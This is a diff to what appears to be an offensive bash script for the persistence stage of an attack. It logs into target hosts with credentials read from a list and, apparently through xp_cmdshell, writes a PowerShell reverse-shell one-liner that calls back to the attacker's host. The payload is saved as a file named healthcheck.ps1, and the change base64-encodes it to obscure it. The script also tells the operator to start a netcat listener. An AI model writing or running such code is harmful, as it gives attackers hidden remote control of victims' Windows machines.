@@ -28,10 +28,10 @@ echo "[*] Starting persistence phase"
 echo "[*] Attacker IP: $LHOST  |  Callback port: $LPORT"
 echo "[*] Scheduled task name: $TASK_NAME"
 echo ""
-echo "[ ! ] You can change the scheduled task name by editing the TASK_NAME"
+echo "[!] You can change the scheduled task name by editing the TASK_NAME"
 echo "      variable at the top of this script (currently: $TASK_NAME)."
 echo ""
-echo "[ ! ] To verify persistence, start a listener before rebooting the target:"
+echo "[!] To verify persistence, start a listener before rebooting the target:"
 echo "      nc -nlvp $LPORT"
 echo ""
 
@@ -50,11 +50,12 @@ while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
     }
 
     # Drop a PowerShell reverse shell one-liner into a script on disk
-    PAYLOAD_PATH="c:\\windows\\temp\\healthcheck.ps1"
-    PS_PAYLOAD="\$c=New-Object System.Net.Sockets.TCPClient(\\\"${LHOST}\\\",${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes(\$r);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"
+    PAYLOAD_PATH="C:\\Windows\\Temp\\healthcheck.ps1"
+    PS_PAYLOAD="\$c=New-Object System.Net.Sockets.TCPClient(\"${LHOST}\",${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes(\$r);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"
 
+    B64_PAYLOAD=$(echo -n "$PS_PAYLOAD" | base64 -w 0)
     echo "[*] Step 1: Writing payload to $PAYLOAD_PATH..."
-    xp "echo ${PS_PAYLOAD} > ${PAYLOAD_PATH}" | \
+    xp "powershell.exe -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''${B64_PAYLOAD}'')) | Set-Content ''${PAYLOAD_PATH}''\"" | \
         grep -v "^$\|SQL\|Impacket\|Press\|\[!\]" | tee -a "$PERSIST_LOG"
 
     # Verify payload landed
